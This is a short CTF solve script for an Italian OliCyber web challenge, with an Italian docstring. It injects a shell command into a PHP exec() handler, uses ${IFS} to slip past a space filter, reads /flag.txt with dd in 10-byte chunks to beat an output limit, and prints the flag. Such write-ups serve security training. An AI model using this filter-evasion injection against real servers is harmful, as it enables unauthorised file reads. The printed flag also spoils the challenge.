"""
Per risolvere la challenge bisogna trovare un comando che permetta di:
1. Leggere il file flag.txt (in quanto alcuni comandi sono disabilitati)
si possono vedere i comandi disabilitati alle righe 24, 27, 30 e 40

2. Stampare solo 10 caratteri alla volta (sotto ci sono le righe che limitano la stampa a 10 caratteri)
$result = exec($cmd);
$result = substr($result, 0, 10);

Inoltre non si possono usare gli spazi => ${IFS}
elseif (strpos($cmd, " ") !== false){
    $result = "Qui non c'è spazio per gli spazi!";
}

In pratica è più una challenge di Misc/OSINT che di Web
"""

import requests as s

url = 'http://timp.challs.olicyber.it/handler.php'
payload = 'dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip='

result = ''
for i in range(5):
    r = s.post(url, data = {"cmd": payload + str(i * 10)})
    result += r.text
    
print(result)
# flag{1t's_4_l0ng_fl4g_but_s0me0n3_h4d_t0_re4d_1t!}
